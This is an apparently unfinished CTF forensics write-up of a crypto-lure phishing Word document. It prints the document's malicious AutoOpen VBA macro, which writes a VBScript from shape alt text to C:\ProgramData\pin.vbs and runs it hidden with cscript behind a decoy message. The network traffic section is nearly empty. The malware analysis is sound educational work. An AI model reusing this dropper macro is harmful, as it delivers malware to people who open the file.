> We have been actively monitoring the most extensive spear-phishing campaign in recent history for the last two months.
> This campaign abuses the current crypto market crash to target disappointed crypto owners.
> A company's SOC team detected and provided us with a malicious email and some network traffic assessed to be associated with a user opening the document.
> Analyze the supplied files and figure out what happened.

> Author: **[0xdf][author-profile]**

## The doc

The document runs a macro when opened:

```shell
olevba2 --deobf --decode --reveal sources/mbcoin.doc > payloads/doc.vba
```

```vba
Sub AutoOpen()
    Dim QQ1 As Object
    Set QQ1 = ActiveDocument.Shapes(1)
    Dim QQ2 As Object
    Set QQ2 = ActiveDocument.Shapes(2)
    RO = StrReverse("\ataDmargorP\:C")
    ROI = RO + StrReverse("sbv.nip")
    ii = StrReverse("")
    Ne = StrReverse("IZOIZIMIZI")
    WW = QQ1.AlternativeText + QQ2.AlternativeText
    MyFile = FreeFile
    Open ROI For Output As #MyFile
    Print #MyFile, WW
    Close #MyFile
    fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))

    waitTill = Now() + TimeValue("00:00:05")
    While Now() < waitTill
    Wend
    MsgBox ("Unfortunately you are not eligable for free coin!")
    End

End Sub
```

The final command string is reversed in the payload, but OleVBA actually wrangles it for us:

```vba
fun = Shell("cmd /k cscript.exe C:\ProgramData\pin.vbs", "0")
```

This payload is aimed at Windows users,

## The network traffic

```shell

```
3 streams, 2 binary and an HTTP 404 page.
[author-profile]: https://app.hackthebox.com/users/4935
